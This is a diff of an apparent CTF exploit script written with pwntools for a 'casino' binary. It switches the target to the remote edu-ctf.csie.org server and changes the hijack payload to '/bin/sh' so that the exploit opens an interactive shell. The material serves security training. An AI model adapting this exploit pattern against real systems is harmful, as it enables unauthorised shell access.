@@ -28,8 +28,8 @@ libc_base_addr = 0
 print(hex(binsh_offset))
 print(hex(system_offset))
 
-r = process("./casino")
-# r = remote('edu-ctf.csie.org', 10176)
+# r = process("./casino")
+r = remote('edu-ctf.csie.org', 10176)
 r.sendlineafter('name: ', name)
 r.sendlineafter('age: ', '87')
 
@@ -131,11 +131,12 @@ while step < 7:
 
     # Step 6: Write the rest of padding zeros in front of the starting address of step 5
     elif step == 6:
-        pause()
         cnt_num = 0
         r_out = 'Chose the number 0:'
-        hijack = libc_base_addr + binsh_offset # --> strange bug, PWN but no flag
-        # hijack= '/bin/sh' # --> PWN and with flag
+        # hijack = libc_base_addr + binsh_offset # --> strange bug, PWN but no flag
+        # print(hex(hijack), ' = ', hijack)
+        # pause()
+        hijack= '/bin/sh' # --> PWN and with flag
         r.sendlineafter(r_out, str(hijack))
         print('finished sending number and payload for step  %d: ' % (step))
         r.interactive()
